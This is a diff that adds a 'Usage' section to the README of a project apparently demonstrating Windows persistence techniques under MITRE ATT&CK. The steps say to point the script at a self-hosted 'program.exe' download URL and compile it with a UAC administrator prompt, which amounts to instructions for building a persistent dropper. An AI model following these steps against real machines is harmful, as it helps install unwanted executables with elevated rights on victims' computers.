@@ -4,6 +4,20 @@ Windows persistence techniques. The script illustrates MITRE ATT&amp;CK tactics 
 [![Python](https://img.shields.io/badge/Python-3.x-blue?logo=python)](https://www.python.org/) &nbsp;
 [![Platform](https://img.shields.io/badge/Windows-10/11-0078D6?logo=windows)](https://www.microsoft.com/windows)
 
+### Usage:
+
+```shell
+git clone https://github.com/vicouncil/MITRE-ATT-CK-Persistence-Service
+```
+```shell
+cd MITRE-ATT-CK-Persistence-Service
+```
+```shell
+On **line 22**, replace `https://example.com` with the URL of your own site where you have uploaded `program.exe`.
+```
+```shell
+python -m PyInstaller --onefile --uac-admin program.py
+```
 # Deployment Flowchart
 ```mermaid
 flowchart TD
